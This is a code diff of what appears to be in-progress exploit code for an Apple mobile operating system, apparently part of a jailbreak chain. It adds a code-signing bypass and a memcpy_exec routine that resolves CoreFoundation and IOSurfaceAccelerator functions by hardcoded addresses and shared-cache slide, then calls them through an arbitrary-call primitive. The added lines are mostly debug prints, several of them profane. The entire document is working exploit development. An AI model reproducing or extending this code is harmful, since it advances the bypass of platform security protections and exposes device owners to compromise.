@@ -7,6 +7,12 @@ var kCFTypeDictionaryValueCallBacks_addr = 0x343c79fc;
 var CFDictionarySetValue_addr = 0x2080a791;
 var CFNumberCreate_addr = 0x2080bc79;
 var kCFNumberSInt32Type = 3;
+var CFShow_addr = 0x208e897c | 1;
+
+var my_kIOSurfaceBytesPerRow;
+var my_kIOSurfaceWidth;
+var my_kIOSurfaceHeight;
+var my_kIOSurfacePixelFormat;
 
 function csbypass() {
 	printf("hello from csbypass!\n");
@@ -19,17 +25,27 @@ function memcpy_exec(dst, src, size) {
 	var width = malloc(4);
 	var height = malloc(4);
 	var pitch = malloc(4);
-	var pixel_format = malloc(4);
+	var pixel_format = malloc(5);
 	write_u32(width, PAGE_SIZE / (16 * 4));
 	write_u32(height, 16);
 	write_u32(pitch, read_u32(width) * 4);
 	write_u32(pixel_format, 0x42475241); // ARGB
-	dict = callnarg(CFDictionaryCreateMutable_addr + get_dyld_shc_slide(), 0, 0, kCFTypeDictionaryKeyCallBacks_addr, kCFTypeDictionaryValueCallBacks_addr);
+	write_u32(pixel_format + 4, 0x0); // ARGB
+	printf("%x %x\n", CFDictionarySetValue_addr + get_dyld_shc_slide(), dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "CFDictionarySetValue"));
+	dict = callnarg(CFDictionaryCreateMutable_addr + get_dyld_shc_slide(), 0, 0, kCFTypeDictionaryKeyCallBacks_addr + get_dyld_shc_slide(), kCFTypeDictionaryValueCallBacks_addr + get_dyld_shc_slide());
 	printf("dict: %p\n", dict);
-	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceBytesPerRow), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, pitch));
+	var test = callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, pitch);
+	printf("fuck you test=%p %p %p\n", test, pitch, read_u32(dict));
+	scall("printf", "%x %x %x %x\n", read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide()), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 4), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 8), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 12));
+	callnarg(CFShow_addr + get_dyld_shc_slide(), dict);
+	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceBytesPerRow), test);
+	printf("fuck1\n");
 	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceWidth), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, width));
+	printf("fuck2\n");
 	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceHeight), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, height));
+	printf("fuck3\n");
 	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfacePixelFormat), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, pixel_format));
+	printf("fuck4\n");
 	printf("fuck you\n");
 	printf("%d\n", callnarg(my_IOSurfaceAcceleratorCreate, 0, 0, accel));
 }
@@ -47,6 +63,10 @@ function linkIOSurface() {
     my_IOSurfaceAcceleratorCreate = dlsym(h, "IOSurfaceAcceleratorCreate");
     my_IOSurfaceCreate = dlsym(h, "IOSurfaceCreate");
     my_IOSurfaceAcceleratorTransferSurface = dlsym(h, "IOSurfaceAcceleratorTransferSurface");
+
+	CFDictionarySetValue_addr = dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "CFDictionarySetValue") - get_dyld_shc_slide();
+
+	scall("printf", "%x %x %x\n", my_IOSurfaceAcceleratorCreate, my_IOSurfaceCreate, my_IOSurfaceAcceleratorTransferSurface);
 }
 
 function poc() {
